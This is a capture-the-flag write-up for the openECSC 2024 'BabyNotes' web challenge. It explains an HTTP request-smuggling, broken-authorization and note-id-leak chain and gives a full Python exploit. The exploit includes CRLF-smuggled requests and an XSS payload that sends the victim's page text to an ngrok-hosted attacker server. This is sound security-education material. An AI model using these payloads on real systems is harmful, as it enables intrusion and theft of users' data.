# openECSC 2024 - Round 2

## [web] BabyNotes (8 solves)

Have a nice and simple note application.

Site: [https://babynotes.challs.open.ecsc2024.it](https://babynotes.challs.open.ecsc2024.it)

Authors: Riccardo Bonafede <@bonaff>, Stefano Alberto <@Xato>

## Overview

The application consists of a site that allows the creation and editing of private notes.

It is also possible to ask a headless bot to visit an arbitrary URL after logging into the application and creating a note containing the flag.


The application consists of 3 different services.

- Backend: the only exposed service, it serves the actual web pages and interacts with the other services
- Auth: authentication service, manages users and creates jwt tokens to authenticate them
- Notes: manages access to notes


## Solution


### Request smuggling

All interactions between the backend and other services are handled by http requests made with the `file_get_contents` function.
For all requests made to notes, the `Authentication` header containing user username and the corresponding jwt generated by the authentication service is added.


This approach is vulnerable to request smuggling, the headers inserted in fact are not sanitized and may include special characters such as \n and \r that allow the HTTP request made to be modified by inserting another one completely controlled by the attacker.
This allows us to interact directly with the note service, bypassing the controls and constraints imposed by the backend.

### XSS

The request smuggling allows us to avoid the sanitization that is performed on the title and content of notes by the backend before sending them to notes, making it possible to inject HTML tags.

Moreover, the note editing functionality does not properly check the permissions of the user who is making the change.

This means that we are able to modify another user's note by being able to insert an XSS payload that will be executed when the victim visits the page to see the note.


```py
@app.post('/edit/<note_id>')
def edit_note(note_id):
    if not request.is_json:
        abort(400)

    title = request.json.get('title', False)
    body = request.json.get('body', False)
    
    if type(title) is not str or type(body) is not str:
        abort(400)

    with get_db() as notes:
        note = notes.get(note_id, False)
        note['title'] = title if title else note['title']
        note['body'] = body if body else note['body']
        note['author'] = note.get('author', g.username)
        notes[note_id] = note
        notes.commit()
    
    return {'status': True, 'id': note_id}
```

To edit another user's note, however, we need to obtain the corresponding id, which is randomly generated when a new note is created.

### Leak note id

Analysing the service for saving notes, we can see that the list of notes of a particular user is saved together with the actual notes, using the username as the key to access the list of notes.

By accessing the note with an id equal to a username, we are actually accessing the list of notes created by the user.
This, however, is impossible due to the checks performed on the author attribute when trying to read access to the note.


```py
@app.get('/view/<note_id>')
def view_note(note_id):
    with get_db() as notes:
        note = notes.get(note_id, False)
    
    if not note:
        return jsonify({'status': False, 'err': 'Note not found'})
    
    if note['author'] != g.username:
        abort(401)

    return jsonify({'status': True, 'note': note})
```

To be able to set the author attribute, we can exploit the logic of the note editing function which, if the author attribute is not present, sets it to the username of the authenticated user.

This allows us to set the author attribute of a given user's note list to the name of a user controlled by us, allowing us to access it using the `/view` endpoint.

After adding the author attribute to the list of victim notes we can exploit request smuggling on the view feature to get the list of notes, and their respective ids, within the error returned by the server.


### Exploit chain

The complete exploit involves the following steps:
- Require the bot to visit the exploit server and save the username used by the bot
- When the bot visits the exploit server, open the page where the real exploit will be executed (/x in my case) with `window.open` and call `history.back()` to reload the page with the note containing the flag (which we will have to overwrite)
- When /x is visited, leak the id of the note containing the flag and overwrite it with the XSS payload that leaks the flag from `opener.document` and respond with a redirect to the overwritten note to trigger the XSS
- Wait for the flag

## Exploit

The exploit is a python script that creates a server listening on port 3001, you need to set `exploit_url` to the address where the server will be reachable (exposed with a service similar to ngrok).

```py
import requests
import re
import secrets
import json
from flask import Flask, request
from werkzeug import run_simple


class Challenge:

    def __init__(self, host) -> None:
        self.url = 'https://' + host
        self.sess = requests.Session()

    
    def register(self, username):
        PATH = '/register.php'

        # Retrieve CSRF token
        resp = self.sess.get(self.url + PATH)
        self.csrf = resp.cookies['csrf']

        data = {
            'username': username,
            'csrf': self.csrf
        }

        resp = self.sess.post(self.url + PATH, data=data).text
        self.username = username

    def edit(self, id, title, body):
        PATH = '/edit.php?id=' + id

        data = {
            'title': title,
            'body': body,
            'csrf': self.csrf
        }

        self.sess.post(self.url + PATH, data=data).text
    
    def view(self, id):
        PATH = '/view.php?id=' + id

        return self.sess.get(self.url + PATH)

    def support(self, url):
        PATH = '/support.php'

        r = self.sess.post(self.url + PATH, data={'url': url, 'csrf': self.csrf})
        m = re.search(r'our agent (\w+) is taking care', r.text)

        if m is None:
            print(r.text)
            
        return m[1]

def smuggled_list(url, id, username, token):
    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


GET /view/{id} HTTP/1.1
Host: notes
foo: bar
Authentication: {username} {token}
foo: bar
'''.format(id=id, buster=secrets.token_urlsafe(6), token=token, username=username).replace('\n', '\r\n')
        
    chall = Challenge(url)
    chall.register(payload)
    resp =  chall.view('1').text
    print(resp)
    regex = r'({&quot;note.*)'
    json_str = re.findall(regex, resp, re.MULTILINE)[0].replace('&quot;', '"')
    return json.loads(json_str)['note']['notes']


def smuggled_edit(url, id, username, token, body, title):
    data = {
        'title': title,
        'body': body
    }

    json_data = json.dumps(data)
    body_length = len(json_data)

    payload = '''{buster}
Host: notes
Connection: keep-alive
Authentication: {username} {token}


POST /edit/{id} HTTP/1.1
Host: notesa
foo: bar
Authentication: {username} {token}
Content-Type: application/json
Content-Length: {body_length}
foo: bar

{json_data}
'''.format(id=id, username=username, token=token, buster=secrets.token_urlsafe(8), body_length=body_length, json_data=json_data).replace('\n', '\r\n')
    chall = Challenge(url)
    chall.register(payload)
    resp =  chall.view('1').text
    print(resp)
        


if __name__ == '__main__':

    URL = 'babynotes.challs.open.ecsc2024.it'
    exploit_url = 'https://5087-62-149-182-69.ngrok-free.app'

    XSS_PAYLOAD = ''''
        <script>
        fetch("''' + exploit_url + '''/leak", 
        {
            method: 'POST',
            body: opener.document.body.innerText,
        })
        </script>
    '''

    chall = Challenge(URL)
    chall.register(secrets.token_urlsafe(8))
    
    app = Flask(__name__)

    @app.route('/')
    def index():
        return '''
            <script>
                window.open('/x')
                window.history.back()
            </script>
            '''
    
    @app.route('/x')
    def expl():
        chall.edit(target_user, 'foo', 'bar')

        notes = smuggled_list(URL, target_user, chall.username, chall.sess.cookies.get('session'))
        noteid = notes[0]

        print('Victim note id', noteid)

        smuggled_edit(URL, noteid, chall.username, chall.sess.cookies.get('session'), XSS_PAYLOAD, 'SMUGGLATO')

        return f'''
            <script>
                location = 'https://{URL}/view.php?id={noteid}';
            </script>
            '''
    
    @app.route('/leak', methods=['POST'])
    def leak():
        print(request.data)

        if 'openECSC{'.encode() in request.data:
            print('Flag found')
        
            exit()


    target_user = chall.support(exploit_url)
    
    print('Target user:', target_user)

    run_simple('localhost', 3001, app)
```
